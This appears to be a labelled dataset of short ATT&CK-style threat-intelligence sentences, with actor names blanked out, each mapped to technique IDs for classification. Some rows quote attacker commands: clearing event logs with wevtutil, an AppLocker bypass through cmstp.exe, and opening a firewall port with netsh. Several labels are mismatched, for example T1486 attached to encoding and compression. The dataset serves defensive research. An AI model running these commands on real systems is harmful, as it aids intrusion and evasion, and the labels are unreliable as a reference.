text1	labels
can collect system information, including computer name, system manufacturer, IsDebuggerPresent state, and execution path.	['T1082', 'T1082']
FIN6 conducted internal reconnaissance with a Windows batch file leveraging Adfind to query Active Directory, then 7-zip to compress the results for exfiltration	['T1018', 'T1069']
, a tool that has been used by adversaries, writes programs to the ADMIN$ network share to execute commands on remote systems.	['T1021.002']
achieves persistence by creating a shortcut in the Startup folder.	['T1547.009', 'T1547.001']
achieves persistence by using various Registry Run keys.	['T1547.001']
A  configuration file is encrypted with a simple XOR key, 0x53.	['T1027']
actors deleted tools and batch files from victim systems.	['T1070.004']
actors installed a credential logger on Microsoft Exchange servers.  also leveraged the reconnaissance framework, ScanBox, to capture keystrokes.	['T1056']
actors mapped network drives using net use.	['T1021.002']
actors used the following command after exploiting a machine with  malware to acquire information about local networks: ipconfig /all >> %temp%\download	['T1016']
actors used the following command following exploitation of a machine with  malware to list local groups: net localgroup administrator >> %temp%\download	['T1069']
added the registry value ntdll to the Registry Run key to establish persistence.	['T1547.001']
adds a sub-key under several Registry run keys.	['T1547.001']
adds collected files to a temp.zip file saved in the %temp% folder, then base64 encodes it and uploads it to control server.	['T1560', 'T1486', 'T1074']
adds itself to the startup folder or adds itself to the Registry key SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run for persistence.	['T1547.001']
adds permissions and remote logins to all users.	['T1098']
adds the setuid flag to a binary so it can easily elevate in the future.	['T1548.001']
Adversaries can direct  to upload files to the C2 Server.	['T1041']
After collecting documents from removable media,  compresses the collected files.	['T1560']
After compromising a victim,  discovers all running services.	['T1007']
After data is collected by  malware, it is exfiltrated over the existing C2 channel.	['T1041']
A module in  collects information about the paths, size, and creation time of files with specific file extensions, but not the actual content of the file.	['T1083']
A module in  gathers logins and passwords stored in applications on the victims, including Google Chrome, Mozilla Firefox, and several other browsers.	['T1552.001']
An  downloader establishes SOCKS5 connections to two separate IP addresses over TCP port 1913 and TCP port 81.	['T1571']
An  loader Trojan saves its payload with hidden file attributes.	['T1564.001']
appears to have functionality to sniff for credentials passed over HTTP, SMTP, and SMB.	['T1040']
A  tool can create a new Registry key under HKEY_CURRENT_USER\Software\Classes\.	['T1112']
automatically collects data about the victim and sends it to the control server.	['T1119']
A  variant accesses a screenshot saved in the clipboard and converts it to a JPG image.	['T1115']
A  variant can use port 127 for communications.	['T1571']
A  variant registers as a Winlogon Event Notify DLL to establish persistence.	['T1547.004']
"A  variant takes screenshots by simulating the user pressing the ""Take Screenshot"" key (VK_SCREENSHOT), accessing the screenshot saved in the clipboard, and converting it to a JPG image."	['T1113']
A  variant uses a custom packer.	['T1027.002']
A version of  introduced in July 2015 obfuscated the binary using opaque predicates and other techniques in a likely attempt to obfuscate it and bypass security products.	['T1027']
A version of  uses the MPRESS packer.	['T1027.002']
backdoor RoyalDNS established persistence through adding a service called Nwsapagent.	['T1543.003']
base64 encodes strings that are sent to the C2 over its DNS tunnel.	['T1001']
binds to a raw socket on a random source port between 31800 and 31900 for C2.	['T1095']
can be configured to only run during normal working hours, which would make its communications harder to distinguish from normal traffic.	['T1029']
can be used to act on (ex: copy, move, etc.) files/directories in a system during (ex: copy files into a staging area before).	['T1005']
can be used to automate exploitation of SQL injection vulnerabilities.	['T1190']
can be used to discover routing configuration information.	['T1016']
can be used to display adapter configuration on Windows systems, including information for TCP/IP, DNS, and DHCP.	['T1016']
can be used to gather information on user accounts within a domain.	['T1087']
can bypass UAC and create an elevated COM object to escalate privileges.	['T1548.002']
can capture screenshots of the desktop over multiple monitors.	['T1113']
can collect system information.	['T1082']
can communicate using HTTP or HTTPS.	['T1071']
can compress data before sending it.	['T1560']
can create a link to itself in the Startup folder to automatically start itself upon system restart.	['T1547.001']
can create a reverse shell that utilizes statically-linked Wine cmd.exe code to emulate Windows command prompt commands.	['T1059']
can decrypt, unpack and load a DLL from its resources.	['T1140']
can download additional components from the C2 server.	['T1105']
"can download a hosted ""beacon"" payload using ."	['T1197']
can download and execute a file from given URL.	['T1105']
can download files.	['T1105']
can download files and upgrade itself.	['T1105']
can dump process memory and extract clear-text credentials.	['T1003']
can enumerate files and directories.	['T1083']
can enumerate registry keys.	['T1012']
can enumerate services.	['T1007']
can execute shell commands.	['T1059']
can gather information about the victim proxy server.	['T1016']
can gather the username from the victim’s machine.	['T1033']
can gather the victim computer name.	['T1082']
can inject content into lsass.exe to load a module.	['T1055']
can install as a Windows service for persistence.	['T1543.003']
can list directory contents.	['T1083']
can obtain a list of running processes on the system.	['T1057']
can obtain a list of users.	['T1087']
can obtain information about network parameters.	['T1016']
can obtain the victim time zone.	['T1124']
can perform audio capture.	['T1123']
can perform credential dumping.	['T1003']
can perform port scans from an infected host.	['T1046']
can perform webcam viewing.	['T1125']
can remove itself from a system.	['T1070.004']
can retrieve an additional payload from its C2 server.	['T1105']
can search files on a victim.	['T1083']
can sleep for a given number of seconds.	['T1029']
can SSH to a remote service.	['T1021']
can start, stop, or delete services.	['T1569.002']
can upload and download files, including second-stage malware.	['T1105']
can use an add on feature when creating payloads that allows you to create custom Python scripts (“scriptlets”) to perform tasks offline (without requiring a session) such as sandbox detection, adding persistence, etc.	['T1064']
can use a WMI script to achieve persistence.	['T1546.003']
can use base64 encoded C2 communications.	['T1132']
can use multiple C2 channels, including RSS feeds, Github, forums, and blogs.  also collects C2 information via a dead drop resolver.	['T1102']
can use Regsvr32 to execute additional payloads.	['T1218.010']
can use steganography to hide malicious code downloaded to the victim.	['T1001']
can use  to execute a payload on a remote host. It can also use Service Control Manager to start new services.	['T1569.002']
can use WMI to deliver a payload to a remote host.	['T1047']
captured audio and sent it out to a C2 server.	['T1123']
captures images from the webcam.	['T1125']
checks for anti-malware products and processes.	['T1518.001']
checks for ant-sandboxing software such as virtual PC, sandboxie, and VMware.	['T1518.001']
checks for the presence of certain security-related processes and deletes its installer/uninstaller component if it identifies any of them.	['T1518.001']
checks its directory location in an attempt to avoid launching in a sandbox.	['T1083']
checks the running processes on the victim’s machine.	['T1057']
collects a list of available servers with the command net view.	['T1018']
collects a list of running services with the command tasklist /v.	['T1057']
collects files from the local system.	['T1005']
collects hostname, volume serial number and OS version data from the victim and sends the information to its C2 server.	['T1082']
collects information about the Internet adapter configuration.	['T1016']
collects information on bookmarks from Google Chrome.	['T1217']
collects information on local user accounts from the victim.	['T1087']
collects information on programs and services on the victim that are configured to automatically run at startup.	['T1007']
collects lists of local accounts with administrative access, local group user accounts, and domain local groups with the commands net localgroup administrators, net localgroup users, and net localgroup /domain.	['T1069']
collects registered owner details by using the commands systeminfo and net config workstation.	['T1033']
collects system information, including the operating system version and hostname.	['T1082']
collects the username from the victim.	['T1033']
collects the victim host name and serial number, and then sends the information to the C2 server.	['T1082']
collects the victim username along with other account information (account type, description, full name, SID and status).	['T1033']
collects the victim username and sends it to the C2 server.	['T1033']
collects user credentials, including passwords, for various programs and browsers, including popular instant messaging applications, Web browsers, and email clients. Windows account hashes, domain accounts, and LSA secrets are also collected, as are WLAN keys.	['T1003']
communicates over port 80 for C2.	['T1043']
communicates with its C2 domain over ports 443 and 8443.	['T1043']
contains a collection of ScriptModification modules that compress and encode scripts and payloads.	['T1027']
contains a command to list processes.	['T1057']
contains a feature to manipulate process privileges and tokens.	['T1134']
contains a module to collect data from removable drives.	['T1025']
contains a module to move data from airgapped networks to Internet-connected systems by using a removable USB device.	['T1052']
contains a network loader to receive executable modules from remote attackers and run them on the local victim. It can also upload and download files over HTTP and HTTPS.	['T1105']
creates a backdoor through which remote attackers can list contents of drives and search for files.	['T1083']
creates a backdoor through which remote attackers can monitor processes.	['T1057']
creates a backdoor through which remote attackers can open a command line interface.	['T1059']
creates a backdoor through which remote attackers can read data from files.	['T1005']
creates a backdoor through which remote attackers can retrieve information such as computer name, OS version, processor speed, memory size, and CPU speed.	['T1082']
creates a file named thumb.dd on all USB flash drives connected to the victim. This file contains information about the infected system and activity logs.	['T1052']
creates a scheduled task on the system that provides persistence.	['T1053.005']
CRYPTO::Extract module can extract keys by interacting with Windows cryptographic application programming interface (API) functions.	['T1552.004']
decodes the configuration data and modules.	['T1140']
decrypts and executes shellcode from a file called Stars.jps.	['T1140']
deletes its payload along with the payload's parent process after it finishes copying files.	['T1070.004']
delets all artifacts associated with the malware from the infected machine.	['T1070']
deobfuscates its code.	['T1140']
developed a file stealer to search C:\ and collect files with certain extensions.  also executed a script to enumerate all drives, store them as a list, and upload generated files to the C2 server.	['T1119']
disables the Windows firewall before binding to a port.	['T1562.001']
downloads additional plug-ins to load on the victim’s machine, including the ability to upgrade and replace its own binary.	['T1105']
downloads and uploads files to and from the victim’s machine.	['T1105']
downloads another dropper from its C2 server.	['T1105']
DPAPI module can harvest protected credentials stored and/or cached by browsers and other user applications by interacting with Windows cryptographic application programming interface (API) functions.	['T1552.001']
drops a malicious file (sspisrv.dll) alongside a copy of lsass.exe, which is used to register a service that loads sspisrv.dll as a driver. The payload of the malicious driver (located in its entry-point function) is executed when loaded by lsass.exe before the spoofed service becomes unstable and crashes.	['T1547.008']
drops and executes a malicious CPL file as its payload.	['T1218.002']
drops files with base64-encoded data.	['T1027']
enables concurrent Remote Desktop Protocol (RDP).	['T1021.001']
encodes C2 communications with base64.	['T1001']
encodes C2 traffic with single-byte XOR keys.	['T1573']
encrypts C2 data with AES256 in ECB mode.	['T1573']
encrypts data using Base64 before being sent to the command and control server.	['T1486']
enumerates all running processes.	['T1057']
enumerates Registry keys associated with event logs.	['T1012']
enumerates registry keys with the command regkeyenum and obtains information for the Registry key HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run.	['T1012']
enumerates running processes to search for Wireshark and Windows Sysinternals suite.	['T1518.001']
establishes persistence by creating a shortcut in the Start Menu folder.	['T1547.001']
establishes persistence via a .lnk file in the victim’s startup path.	['T1547.009']
executes batch scripts on the victim’s machine.	['T1064']
exfiltrates data collected from the victim mobile device.	['T1005']
exfiltrates data over its C2 channel.	['T1041']
exfiltrates data to its C2 server over the same protocol as C2 communications.	['T1041']
exfiltrates files over FTP.	['T1048']
extracts basic information about the operating system.	['T1082']
"For C2 over HTTP,  encodes data with base64 and sends it via the ""Cookie"" field of HTTP requests. For C2 over DNS,  converts ASCII characters into their hexadecimal values and sends the data in cleartext."	['T1132']
Freenki malware lists running processes using the Microsoft Windows API.	['T1057']
functions as a proxy server between the victim and C2 server.	['T1090']
gathers and beacons the MAC and IP addresses during installation.	['T1016']
gathers computer name and information using the systeminfo command.	['T1082']
gathers credentials in files for chrome, 1password, and keychains.	['T1552.001']
gathers information about the OS architecture, OS name, and OS version/Service pack.	['T1082']
gathers information on the system and local drives.	['T1082']
gathers information on victim’s drives and has a plugin for document listing.	['T1083']
gathers the local IP address.	['T1016']
generates a false TLS handshake using a public certificate to disguise C2 network communications.	['T1001']
Get-MicrophoneAudio Exfiltration module can record system microphone audio.	['T1123']
Get-TimedScreenshot Exfiltration module can take screenshots at regular intervals.	['T1113']
harvests plain-text credentials as a password filter registered on domain controllers.	['T1556.002']
has a command named $screenshot that may be responsible for taking screenshots of the victim machine.	['T1113']
has a command to collect victim system information, including the system name and OS version.	['T1082']
has a command to create, set, copy, or delete a specified Registry key or value.	['T1112']
has a command to create Registry entries for storing data under HKEY_CURRENT_USER\SOFTWARE\Microsoft\WABE\DataPath.	['T1112']
has a command to return a directory listing for a specified directory.	['T1083']
has a command to upload to its C2 server information about files on the victim mobile device, including SD card size, installed app list, SMS content, contacts, and calling history.	['T1083']
has a feature to list the available services on the system.	['T1007']
has a hard-coded primary and backup C2 string.	['T1008']
has a module named BeetleJuice that contains Bluetooth functionality that may be used in different ways, including transmitting encoded information from the infected system over the Bluetooth protocol, acting as a Bluetooth beacon, and identifying other Bluetooth devices in the vicinity.	['T1011']
has a plugin for VNC and Ammyy Admin Tool.	['T1219']
has a tool that can delete files.	['T1070.004']
has a tool that can obtain information about the local system.	['T1082']
has a tool that creates a new service for persistence.	['T1543.003']
has a VBScript for execution.	['T1064']
has batch files that modify the system service COMSysApp to load a malicious DLL.	['T1543.003']
has been known to dump credentials.	['T1003']
has been known to side load DLLs with a valid version of Chrome with one of their tools.	['T1574.002']
has been seen persisting via COM hijacking through replacement of the COM object for MruPidlList {42aedc87-2188-41fd-b9a3-0c966feabec1} or Microsoft WBEM New Event Subsystem {F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1} depending on the system's CPU architecture.	['T1546.015']
has cleared event logs, including by using the commands wevtutil cl System and wevtutil cl Security.	['T1070']
has cleared event logs from victims.	['T1070']
has collected data from remote systems by mounting network shares with net use and using Robocopy to transfer data.	['T1039']
has created password-protected RAR, WinImage, and zip archives to be exfiltrated.	['T1560', 'T1486']
has created scheduled tasks that run a VBScript to execute a payload on victim machines.	['T1053.005']
has delivered zero-day exploits and malware to victims by injecting malicious code into specific public Web pages visited by targets within a particular sector.	['T1189']
has downloaded and executed additional plugins.	['T1105']
has dropped binaries as files named microsoft_network.exe and crome.exe.	['T1036']
has encrypted its payload with RC4.	['T1027']
has exploited multiple Microsoft Office and .NET vulnerabilities for execution, including CVE-2017-0199, CVE-2017-8759, and CVE-2017-11882.	['T1203']
has functionality to copy itself to removable media.	['T1091']
has gathered a process list by using .exe.	['T1057']
has gathered information about network IP configurations using .exe and about routing tables using .exe.	['T1016']
has has extensively used strategic Web compromises to target victims.	['T1189']
has leveraged both Spearphishing Link and Spearphishing Attachment attempting to gain User Execution.	['T1204']
has lured users to click links to malicious HTML applications delivered via spearphishing emails.	['T1204']
has obfuscated a script with Crypto Obfuscator.	['T1027']
has run ipconfig /all on a victim.	['T1016']
has sent spearphishing emails links and attachments attempting to get a user to click.	['T1204']
has sent spearphishing emails with attachments to victims as its primary initial access vector.	['T1598.002']
has sent spearphishing emails with password-protected RAR archives containing malicious Excel Web Query files (.iqy). The group has also sent spearphishing emails that contained malicious Microsoft Office documents that use the “attachedTemplate” technique to load a template from a remote server.	['T1598.002']
has sent spearphising emails with malicious attachments to potential victims using compromised and/or spoofed email accounts.	['T1598.002']
has sent spearphising emails with malicious links to potential victims.	['T1598.003']
has targeted manufacturers in the supply chain for the defense industry.	['T1195']
has the ability to enumerate files and drives.	['T1083']
has the ability to obtain a victim's system name and operating system version.	['T1082']
has the ability to remotely execute commands.	['T1059']
has the ability to search for a given process name in processes currently running in the system.	['T1057']
has the capability to delete files.	['T1070.004']
has the capability to download files to execute on the victim’s machine.	['T1105']
has the capability to execute the command net localgroup administrators.	['T1069']
has the capability to gather the OS version and computer name.	['T1082']
has the capability to obtain the time zone information and current timestamp of the victim’s machine.	['T1124']
has the capability to upload and download files to the victim's machine.	['T1105']
has used a credential stealer known as ZUMKONG that can harvest usernames and passwords stored in browsers.	['T1003']
has used a plug-in to gather credentials stored in files on the host by various software programs, including The Bat! email client, Mozilla password manager, Google Chrome password manager, Outlook, Internet Explorer, and Windows Credential Store.	['T1552.001']
has used a tool called RarStar that encodes data with a custom XOR algorithm when posting it to a C2 server.	['T1573']
"has used a VBScript named ""ggldr"" that uses Google Apps Script, Sheets, and Forms services for C2."	['T1102']
has used both HTTP and HTTPS for C2.	['T1071']
has used CHM files to move concealed payloads as part of.	['T1218.001']
has used command-line interfaces for execution.	['T1059']
has used CVE-2016-7255 to escalate privileges.	['T1068']
has used DLL side-loading to launch versions of Mimikatz and PwDump6 as well as .	['T1574.002']
has used FTP to exfiltrate collected data.	['T1048']
has used HTTP and HTTPS for C2 communications.	['T1071']
has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor.	['T1547.009', 'T1547.001']
has used local servers with both local network and Internet access to act as internal proxy nodes to exfiltrate data from other parts of the network without direct Internet access.	['T1090']
has used net user to conduct internal discovery of systems.	['T1087']
has used net use to conduct connectivity checks to machines.	['T1049']
has used PowerShell Empire.	['T1059.001']
has used RAR to compress, encrypt, and password-protect files prior to exfiltration.	['T1560', 'T1486']
has used RAR to compress files before moving them outside of the victim network.	['T1560']
has used Registry keys to detect and avoid executing in potential sandboxes.	['T1518.001']
has used Registry Run keys to establish persistence for its downloader tools known as HARDTACK and SHIPBREAD.	['T1547.001']
has used remote code execution to download subsequent payloads.	['T1105']
has used rundll32.exe in a Registry value to establish persistence.	['T1218.011']
has used scheduled task raw XML with a backdated timestamp of June 2, 2016.	['T1070.006']
has used spearphishing with a link to trick victims into clicking on a link to a zip file containing malicious files.	['T1598.003']
has used spearphishing with links to deliver files with exploits to initial victims. The group has used embedded image tags (known as web bugs) with unique, per-recipient tracking links in their emails for the purpose of identifying which recipients opened messages.	['T1598.003']
has used TCP port 8080 for C2.	['T1043']
has used the command cmstp.exe /s /ns C:\Users\ADMINI~W\AppData\Local\Temp\XKNqbpzl.txt to bypass AppLocker and launch a malicious script.	['T1218.003']
has used the publicly available tool SoftPerfect Network Scanner as well as a custom tool called GOLDIRONY to conduct network scanning.	['T1046']
has used  to gather the OS version, as well as information on the system configuration, BIOS, the motherboard, and the processor.	['T1082']
has used  to get information on processes.	['T1057']
has used tools to exploit Windows vulnerabilities in order to escalate privileges. The tools targeted CVE-2013-3660, CVE-2011-2005, and CVE-2010-4398, all of which could allow local users to access kernel-level privileges.	['T1068']
has used tools to perform keylogging.	['T1056']
has used to use DLL side-loading to evade anti-virus and to maintain persistence on a victim.	['T1574.002']
has used valid accounts for privilege escalation.	['T1078']
has used watering holes to deliver files with exploits to initial victims.	['T1189']
has used WMI for execution.	['T1047']
hooks processes by modifying IAT pointers to CreateWindowEx.	['T1056.004']
identified and extracted all Word documents on a server by using a command containing * .doc and *.docx. The actors also searched for documents based on a specific date range and attempted to identify all installed software on a victim.	['T1083']
identifies files with certain extensions from USB devices, then copies them to a predefined directory.	['T1083']
If running in a Windows environment,  saves a DLL to disk that is injected into the explorer.exe process to execute the payload.  can also be configured to inject and execute within specific processes.	['T1055']
If the victim is using PowerShell 3.0 or later,  writes its decoded payload to an alternate data stream (ADS) named kernel32.dll that is saved in %PROGRAMDATA%\Windows\.	['T1564.004']
injects itself into the secure shell (SSH) process.	['T1055']
"In one instance,  added  as a service with a display name of ""Corel Writing Tools Utility."""	['T1036']
installer/uninstaller component deletes itself if it encounters a version of Windows earlier than Windows XP or identifies security-related processes running.	['T1070.004']
installer uses WMI to search for antivirus display names.	['T1047']
installs a service on the remote system, executes the command, then uninstalls the service.	['T1569.002']
installs itself as a service for persistence.	['T1543.003']
installs itself as a service to maintain persistence.	['T1543.003']
"installs itself in %ALLUSERPROFILE%\\Application Data\Microsoft\MediaPlayer\updatewindws.exe; the directory name is missing a space and the file name is missing the letter ""o."""	['T1036']
installs VNC server software that executes through rundll32.	['T1218.011']
is a Web shell that appears to be exclusively used by . It is installed as an ISAPI filter on Exchange servers and shares characteristics with the  Web shell.	['T1505.003']
is capable of capturing keystrokes on victims.	['T1056']
is capable of capturing screenshots.	['T1113']
is capable of capturing video.	['T1125']
is capable of downloading a file from a specified URL.	['T1105']
is capable of enumerating Registry keys and values.	['T1012']
is capable of gathering system information.	['T1082']
is capable of leveraging cloud storage APIs such as Cloud, Box, Dropbox, and Yandex for C2.	['T1102']
is capable of modifying the Registry.	['T1112']
is capable of providing Meterpreter shell access.	['T1059']
is capable of spawning a reverse shell on a victim.	['T1059']
is known to use PowerShell.	['T1059.001']
is loaded and executed by a highly obfuscated launcher.	['T1027']
is used for proxying connections to obfuscate command and control infrastructure.	['T1090']
It is believed that a patch management system for an anti-virus product commonly installed among targeted companies was used to distribute the  malware.	['T1072']
kills antimalware running process.	['T1562.001']
launched an HTTP malware variant and a Port 22 malware variant using a legitimate executable that loaded the malicious DLL.	['T1574.002']
launches a DLL file that gets executed as a service using svchost.exe	['T1569.002']
leverages a known zero-day vulnerability in Adobe Flash to execute the implant into the victims’ machines.	['T1203']
leverages the Windows API calls: VirtualAlloc(), WriteProcessMemory(), and CreateRemoteThread() for process injection.	['T1106']
lists local users and session information.	['T1033']
lists the current processes running.	['T1057']
lists the running processes on the system.	['T1057']
looked for a specific process running on infected servers.	['T1057']
malware can download a remote access tool, NanoCore, and inject into another process.	['T1055']
malware can use cmd.exe to download and execute payloads and to execute commands on the system.	['T1059']
malware can use PowerShell commands to download and execute a payload and open a decoy document on the victim’s machine.	['T1059.001']
malware gathers system information via WMI, including the system directory, build number, serial number, version, manufacturer, model, and total physical memory.	['T1082']
malware IndiaIndia saves information gathered about the victim to a file that is uploaded to one of its 10 C2 servers.  malware RomeoDelta copies specified directories from the victim's machine, then archives and encrypts the directories before uploading to its C2 server.	['T1005']
malware is capable of keylogging.	['T1056']
Malware used by  is capable of watching the victim's screen.	['T1113']
may collect process information by running tasklist on a victim.	['T1057']
may collect user account information by running net user /domain or a series of other commands on a victim.	['T1087']
may create a .lnk file to itself that is saved in the Start menu folder. It may also create the Registry key HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ IMJPMIJ8.1{3 characters of Unique Identifier}.	['T1547.001']
may query the Registry by running reg query on a victim.	['T1012']
may use net start to display running services.	['T1007']
may use netstat -ano to display active network connections.	['T1049']
MISC::AddSid module can appended any SID or user/group account to a user's SID-History.  also utilizes  to expand the scope of other components such as generated Kerberos Golden Tickets and DCSync beyond a single domain.	['T1134.005']
modified the Registry to perform multiple techniques through the use of .	['T1112']
modifies the tty_tickets line in the sudoers file.	['T1548.003']
monitors victims for insertion of removable drives. When dropped onto a second victim, it also enumerates drives connected to the system.	['T1120']
obfuscates C2 traffic with an altered version of base64.	['T1001']
obtains a build identifier as well as victim hard drive information from Windows registry key HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum. Another  variant gathers the victim storage volume serial number and the storage device name.	['T1082']
obtains the target's IP address and local network segment.	['T1016']
One persistence mechanism used by  is to set itself to be executed at system startup by adding a Registry value under one of the following Registry keys: <br>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ <br>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ <br>HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run <br>HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run	['T1547.001']
One  variant connected to its C2 server over port 8080.	['T1043']
"One  variant decrypts an archive using an RC4 key, then decompresses and installs the decrypted malicious DLL module. Another variant decodes the embedded file by XORing it with the value ""0x35""."	['T1140']
One variant of  locates existing driver services that have been disabled and drops its driver component into one of those service's paths, replacing the legitimate executable. The malware then sets the hijacked service to start automatically to establish persistence.	['T1574.010']
packed an executable by base64 encoding the PE file and breaking it up into numerous lines.	['T1027.002']
performs a connection test to discover remote systems in the network	['T1018']
performs code injection injecting its own functions to browser processes.	['T1055']
performs local network configuration discovery using ipconfig.	['T1016']
performs XOR encryption.	['T1573']
persists by creating a Registry entry in HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\.	['T1547.001']
persists through a scheduled task that executes it every minute.	['T1053.005']
places scripts in the startup folder for persistence.	['T1547.001']
presents an input prompt asking for the user's login and password.	['T1056']
prompts the user for credentials.	['T1056']
prompts the users for credentials.	['T1056']
provides command-line access to the compromised system.	['T1059']
queried the Registry to identify victim information.	['T1012']
regained access after eviction via the corporate VPN solution with a stolen VPN certificate, which they had extracted from a compromised host.	['T1133']
regularly deploys both publicly available and custom password retrieval tools on victims.	['T1003']
removed certain files and replaced them so they could not be retrieved.	['T1070.004']
Responses from the  C2 server are base32-encoded.	['T1132']
runs the command net start on a victim.	['T1007']
saves information from its keylogging routine as a .zip file in the present working directory.	['T1074']
"saves itself with a leading ""."" to make it a hidden file."	['T1564.001']
saves one of its files as mpr.dll in the Windows folder, masquerading as a legitimate library file.	['T1036']
scans the victim for files that contain certain keywords from a list that is obtained from the C2 as a text file. It also collects information about installed software.	['T1083']
scans to identify open ports on the victim.	['T1046']
scrapes memory for properly formatted payment card data.	['T1005']
searches and reads the value of the Windows Update Registry Run key.	['T1012']
searches for files on the victim's machine.	['T1083']
searches for interesting files (either a default or customized set of file extensions) on the local system.  will scan the My Recent Documents, Desktop, Temporary Internet Files, and TEMP directories.  also collects information stored in the Windows Address Book.	['T1005']
searches through connected drives for removable storage devices.	['T1120']
searches through the drive containing the OS, then all drive letters C through to Z, for documents matching certain extensions.	['T1083']
selective infector modifies executables stored on removable media as a method of spreading across computers.	['T1091']
sends collected files back over same C2 channel.	['T1041']
sent emails to victims with malicious Microsoft Office documents attached.	['T1598.002']
sent spearphishing emails with malicious attachments in RTF and XLSM formats to deliver initial exploits.	['T1598.002']
Several commands are supported by the 's implant via the command-line interface and there’s also a utility to execute any custom command on an infected endpoint.	['T1059']
Several  malware families gather a list of running processes on a victim system and send it to their C2 server. A Destover-like variant used by  also gathers process times.	['T1057']
Some  samples encrypt C2 communications with RC4.	['T1573']
Some  strings are base64 encoded, such as the embedded DLL known as MockDll.	['T1027']
Some  variants add new services with display names generated by a list of hard-coded strings such as Application, Background, Security, and Windows, presumably as a way to masquerade as a legitimate service.	['T1036']
Some  variants establish persistence by modifying the Registry key HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\Run:%appdata%\NeutralApp\NeutralApp.exe.	['T1547.001']
Some  variants incorporate an MBR rootkit.	['T1542.003']
Some  variants use port 8088 for C2.	['T1571']
stage 1 modules for 64-bit systems have been found to be signed with fake certificates masquerading as originating from Microsoft Corporation and Broadcom Corporation.	['T1553.002']
"stages data it copies from the local system or removable drives in the ""%WINDIR%\$NtUninstallKB885884$\"" directory."	['T1074']
steals credentials stored inside Internet Explorer.	['T1003']
steals user files from removable media with file extensions and keywords that match a predefined list.	['T1025']
stole domain credentials from Microsoft Active Directory Domain Controller and leveraged .	['T1003']
stores configuration items in alternate data streams (ADSs) if the Registry is not accessible.	['T1564.004']
strings, network data, configuration, and modules are encrypted with a modified RC4 algorithm.	['T1027']
supports peer connections.	['T1090']
surveys a system upon check-in to discover running processes using the tasklist /v command.	['T1057']
takes a screenshot of the screen and displays it on top of all other windows for few seconds in an apparent attempt to hide some messages showed by the system during the setup process.	['T1113']
takes periodic screenshots and exfiltrates them.	['T1113']
takes screenshots of the user's desktop.	['T1113']
terminates antimalware processes.	['T1562.001']
tests if it can reach its C2 server by first attempting a direct connection, and if it fails, obtaining proxy settings and sending the connection through a proxy, and finally injecting code into a running browser if the proxy method fails.	['T1008']
The  backdoor is a Web shell that supports server payloads for many different kinds of server-side scripting languages and contains functionality to access files, connect to a database, and open a virtual command prompt.	['T1505.003']
The C2 server used by  provides a port number to the victim to use as a fallback in case the connection closes on the currently used port.	['T1008']
The  credential dumper contains an implementation of an SSP.	['T1547.005']
The  credential dumper has been extended to include Skeleton Key domain controller authentication bypass functionality. The LSADUMP::ChangeNTLM and LSADUMP::SetNTLM modules can also manipulate the password hash of an account without knowing the clear text value.	['T1098']
The executable version of  has a module to log clipboard contents.	['T1115']
The  group is known to have used RDP during operations.	['T1021.001']
The  malware platform uses Extended Attributes to store encrypted executables.	['T1564.004']
The  malware uses custom Base64 encoding schemes to obfuscate data command and control traffic in the message body of HTTP requests.	['T1001']
the victim's internal network for hosts with ports 8080, 5900, and 40 open.	['T1046']
To move laterally on a victim network,  has used credentials stolen from various systems on which it gathered usernames and password hashes.	['T1078']
Tools used by  are capable of downloading and executing additional payloads.	['T1105']
TRINITY malware used by  encodes data gathered from the victim with a simple substitution cipher and single-byte XOR using the OxAA key.	['T1486']
uploads files from a specified directory to the C2 server.	['T1005']
used an HTTP malware variant and a Port 22 malware variant to collect the MAC address and IP address from the victim’s machine.	['T1016']
used an open-source tool, Phishery, to inject malicious remote template URLs into Microsoft Word documents and then sent them to victims to enable .	['T1221']
used a proxy server between victims and the C2 server.	['T1090']
used a signed credential-dumping tool to obtain victim account credentials.	['T1003']
used a tool called MailSniper to search through the Exchange server mailboxes for keywords.	['T1114']
used a valid AppleDeveloperID to sign the code to get past security restrictions.	['T1553.002']
used batch scripts to enumerate administrators in the environment.	['T1069']
used HTTP for C2 communications.  also used an HTTP malware variant to communicate over HTTP for C2.	['T1071']
used legitimate programs such as AmmyAdmin and Team Viewer for remote interactive C2 to target systems.	['T1219']
used Microsoft’s Sysinternals tools to gather detailed information about remote systems.	['T1018']
used net use commands to connect to lateral systems within a network.	['T1021.002']
used spearphishing with Microsoft Office attachments to target victims.	['T1598.002']
used TCP port 80 for C2.	['T1043']
used the public tool BrowserPasswordDump10 to dump passwords saved in browsers on victims.	['T1003']
used various types of scripting to perform operations, including Python and batch scripts. The group was observed installing Python 2.7 on a victim.	['T1064']
uses a backdoor known as BADFLICK that is is capable of generating a reverse shell.	['T1059']
uses a command prompt to run a PowerShell script from Excel.	['T1059']
uses a custom command and control protocol that is encapsulated in HTTP, HTTPS, or DNS. In addition, it conducts peer-to-peer communication over Windows named pipes encapsulated in the SMB protocol. All protocols use their standard assigned ports.	['T1071']
uses AES to encrypt C2 traffic.	['T1573']
uses an XOR 0x1 loop to encrypt its C2 domain.	['T1573']
uses basic obfuscation in the form of spaghetti code.	['T1027']
uses cmd.exe to execute netshcommands.	['T1059']
uses commonly used ports (like HTTPS/443) for command and control.	['T1043']
uses custom encryption for C2 using 3DES and RSA.	['T1573']
uses HTTP/HTTPS for command and control communication.	['T1071']
uses HTTP for command and control.	['T1071']
uses HTTP over port 443 for command and control.	['T1043']
uses macOS' .command file type to script actions.	['T1064']
uses multiple proxies to obfuscate network traffic from victims.	['T1090']
uses net.exe to connect to network shares using net use commands with compromised credentials.	['T1021.002']
uses PowerShell to execute various commands, one to execute its payload.	['T1059.001']
uses raw sockets to communicate with its C2 server.	['T1095']
uses RC4 to encrypt C2 responses.	['T1573']
uses rundll32 to load various tools on victims, including a lateral movement tool named Vminst, Cobalt Strike, and shellcode.	['T1218.011']
uses tasklist /svc to display running tasks.	['T1007']
"uses the command cmd.exe /c netsh firewall add portopening TCP 443 ""adp"" and makes the victim machine function as a proxy server."	['T1090']
